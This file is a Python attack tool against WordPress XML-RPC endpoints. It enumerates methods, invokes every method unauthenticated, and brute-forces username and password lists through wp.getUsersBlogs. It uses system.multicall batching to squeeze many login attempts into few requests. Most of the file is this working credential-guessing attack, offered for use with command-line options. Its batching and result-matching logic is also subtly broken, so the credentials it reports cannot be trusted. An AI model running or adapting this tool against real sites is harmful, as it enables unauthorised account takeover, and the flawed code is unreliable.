import requests
import argparse
import logging
import xmlrpc.client


logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s - Line: %(lineno)d', )
logger = logging.getLogger('xml-rpc')

class Xmlrpc:
    """XMLRPC class to interact with XMLRPC server"""

    def __init__(self, url):
        self.url = url
        self.server = xmlrpc.client.ServerProxy(url)
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        }


    def list_methods(self):
        """List all methods available on the XMLRPC server"""
        return self.server.system.listMethods()
        

    def unauthenticated_methods(self):
        """Test every methods and get the return"""
        try:
            methods = self.server.system.listMethods()
            unauth_methods = []
            for method in methods:
                try:
                    response = getattr(self.server, method)()
                    unauth_methods.append(method)
                except xmlrpc.client.Fault as err:
                    logger.log(logging.INFO, f"Method '{method}' requires authentication or produced an info: {err.faultString}")
        except Exception as e:
            logger.error(f"An unexpected error occurred: {e}")
        logger.log(logging.INFO, f"Methods that don't need auth : {unauth_methods} ")
        return unauth_methods


    def bruteforce_users(self, username_list, password_list):
        """Bruteforce users/pass with a list of usernames and passwords using multicall to reduce amount of requests"""
        try:
            multicall_requests = []
            good = []
            results = []
            i = 0
            for username in username_list:
                for password in password_list:
                    multicall_requests.append({'methodName': 'wp.getUsersBlogs', 'params': [username, password]})
                    if i == 50: # Limit requests to 50 per multicall
                        results += self.server.system.multicall(multicall_requests)
                        multicall_requests = []
                    i+=1
            results += self.server.system.multicall(multicall_requests)

            for i, result in enumerate(results):
                try:
                    if isinstance(result, dict) and 'faultCode' in result:
                        logger.info(f"Access denied for {multicall_requests[i]['params']}: {result.get('faultString')}")
                    else:
                        good.append(multicall_requests[i]['params'])
                        logger.info(f"Successful login for {multicall_requests[i]['params']}")
                except ValueError as e:
                    print("Error : ",e)
        
        except Exception as e:
            logger.error(f"XMLRPC An unexpected error occurred: {e}")

        if not good:
            logger.log(logging.INFO, f"No successful users/password found.")
        else:
            logger.log(logging.INFO, f"Valid credentials found : \n{good} ")
        return good

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='XMLRPC')
    parser.add_argument('-url', metavar='TARGET_URL', help='Website URL. Ex : http://example.com/xmlrpc.php', required=True)
    parser.add_argument('-users', metavar='USERNAME_FILE', help='File path for usernames for bruteforce ', required=False)
    parser.add_argument('-passwords', metavar='PASSWORD_FILE', help='File path for password for bruteforce', required=False)
    parser.add_argument('-list', help='List all available methods', required=False)
    parser.add_argument('-unauth', help='List available unauthenticated methods ', required=False)

    args = parser.parse_args()

    xm = Xmlrpc(args.url)
    
    if args.users and args.passwords:
        with open(args.users, 'r') as f:
            users = [line.strip() for line in f.readlines()]
        with open(args.passwords, 'r') as f:
            passwords = [line.strip() for line in f.readlines()]
        xm.bruteforce_users(users, passwords)

    if args.list:
        methods = xm.list_methods()
        print(f"Methods available on the server : {methods}")
    elif args.unauth:
        unauth = xm.unauthenticated_methods()
        print(f"Methods that doesn't need logging : {unauth}")


